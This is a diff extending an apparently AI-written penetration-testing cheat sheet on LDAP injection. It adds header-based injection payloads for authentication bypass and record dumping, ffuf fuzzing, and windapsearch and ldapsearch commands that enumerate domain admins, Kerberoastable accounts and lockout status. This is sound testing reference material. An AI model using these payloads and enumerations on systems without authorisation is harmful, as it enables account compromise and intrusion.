@@ -18,6 +18,7 @@ LDAP query injection via unsanitized input — enables auth bypass, attribute en
 | `ldapsearch` | Manual enumeration and auth bypass testing — `ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(objectClass=*)"` |
 | `ldapdomaindump` | Enumerate AD over LDAP and output HTML/JSON — `ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>` |
 | `Metasploit` | `auxiliary/scanner/ldap/ldap_login` for credential brute-force |
+| `windapsearch` | LDAP-based AD enumeration — users, groups, computers, DAs — `pip3 install windapsearch` |
 | SecLists | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Injection.Fuzz.Strings.txt` |
 
 ---
@@ -194,6 +195,28 @@ curl -s -X POST "http://<target>/login" --data-urlencode "username=doesnotexist1
 
 ---
 
+## LDAP Injection via HTTP Headers
+
+Apps that log or process HTTP headers through LDAP filters are a less-tested injection point.
+
+```bash
+# Test LDAP metacharacters in common headers
+curl -s -H "X-Forwarded-For: *(|(uid=*)" "http://<target>/app"
+curl -s -H "User-Agent: admin)(&(uid=admin" "http://<target>/app"
+curl -s -H "X-Username: *)(|(uid=*" "http://<target>/app"
+curl -s -H "Referer: admin)(&" "http://<target>/app"
+
+# If the header value is used in an LDAP filter for session lookup, rate limiting, or user resolution:
+# Inject to dump all records: header value → *)(&
+# Auth bypass: header value → admin)(&
+
+# Burp: add header to every request via Match & Replace or Session Handling Rule
+# Fuzz header values with SecLists LDAP list
+ffuf -u "http://<target>/app" -H "X-User: FUZZ" -w /usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt -mc 200,302
+```
+
+---
+
 ## LDAP Injection in Search/Filter Fields
 
 When app has search functionality backed by LDAP:
@@ -242,6 +265,61 @@ ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>
 
 ---
 
+### windapsearch
+
+```bash
+# Install
+pip3 install windapsearch
+# or: git clone https://github.com/ropnop/windapsearch
+
+# Enumerate domain users
+windapsearch -d <domain> -u <user>@<domain> -p <pass> --users
+
+# Domain admins
+windapsearch -d <domain> -u <user>@<domain> -p <pass> --da
+
+# All groups + members
+windapsearch -d <domain> -u <user>@<domain> -p <pass> --groups
+
+# Computers
+windapsearch -d <domain> -u <user>@<domain> -p <pass> --computers
+
+# Custom filter — all users with SPN set (Kerberoastable)
+windapsearch -d <domain> -u <user>@<domain> -p <pass> --custom "(&(objectClass=user)(servicePrincipalName=*))"
+```
+
+### Operational Attributes — Attack Planning Data
+
+```bash
+# Get lockout / password status for a specific account
+ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
+  -b "dc=<domain>,dc=com" \
+  "(&(objectClass=user)(sAMAccountName=<target_user>))" \
+  pwdLastSet lockoutTime badPwdCount badPasswordTime lastLogon userAccountControl
+
+# Decode pwdLastSet / lastLogon (Windows FILETIME → datetime)
+python3 -c "
+import datetime
+ft = <filetime_value>
+print(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ft//10))
+"
+
+# Dump all users + lockout status (hunt for locked or password-never-set accounts)
+ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
+  -b "dc=<domain>,dc=com" \
+  "(&(objectClass=user)(objectCategory=person))" \
+  sAMAccountName pwdLastSet lockoutTime badPwdCount userAccountControl | \
+  grep -E "sAMAccountName|pwdLastSet|lockoutTime|badPwdCount"
+
+# Useful userAccountControl flags:
+# 512   = normal enabled account
+# 514   = disabled
+# 66048 = password never expires
+# 8388608 = password expired
+```
+
+---
+
 ## Quick Reference
 
 ```bash
@@ -265,5 +343,5 @@ a*)(&               # users starting with 'a'
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
